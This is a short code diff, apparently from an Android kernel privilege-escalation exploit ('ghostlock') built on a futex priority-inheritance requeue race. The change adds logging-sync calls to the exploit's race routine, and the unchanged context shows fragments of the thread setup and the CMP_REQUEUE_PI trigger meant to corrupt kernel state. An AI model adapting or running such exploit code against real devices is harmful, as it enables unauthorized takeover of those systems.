@@ -175,6 +175,7 @@ ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
     while (!waiter_waiting.load() || !owner_started.load())
         usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
     pr_info("[route] waiter parked; owner started\n");
+    support::log_sync();
     usleep(fast_repair.load()
                ? 5000
                : session::g_exploit_session.profile.race_setup_settle_us());
@@ -184,6 +185,7 @@ ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
                                 &target_futex, 0);
     pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
             rq, errno);
+    support::log_sync();
     /* TODO(pi-timeout-01): This wait has no deadline. A route that stalls in
      * the race window (observed when the Shizuku log pipe applied
      * backpressure) parks the process forever and the corrupted PI chain is
@@ -218,6 +220,7 @@ namespace ghostlock::race {
     Status run_main_route_threads(const memory::WriteRequest &request) {
         reset_main_route_state();
         pr_info("[route] creating waiter/owner/consumer\n");
+        support::log_sync();
         int32_t error = session::g_exploit_session.race.start_threads(
             waiter_thread, owner_thread, consumer_thread, &request);
         if (error) {
@@ -244,6 +247,7 @@ namespace ghostlock::race {
             support::fail_stop_dirty_race("PI worker join", join_error);
         }
         pr_info("[route] threads joined\n");
+        support::log_sync();
         return status.code == route::ROUTE_OK;
     }
 } // namespace ghostlock::race
